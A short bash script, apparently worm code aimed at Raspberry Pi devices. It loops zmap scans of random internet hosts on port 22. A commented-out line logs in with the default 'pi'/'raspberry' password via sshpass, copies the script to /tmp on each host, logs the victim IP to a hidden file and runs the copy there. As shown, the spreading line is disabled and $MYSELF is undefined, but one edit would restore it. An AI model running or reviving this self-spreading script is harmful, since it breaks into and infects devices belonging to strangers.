#!/bin/bash

NAME=`mktemp -u 'XXXXXXXX'`
 
while [ true ]; do
    FILE=`mktemp`
    zmap -p 22 -o $FILE -n 100000 -v 0
    #killall ssh scp
    for IP in `cat $FILE`
    do
        :
        #sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /tmp/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
    done
    rm -rf $FILE
    sleep 10
done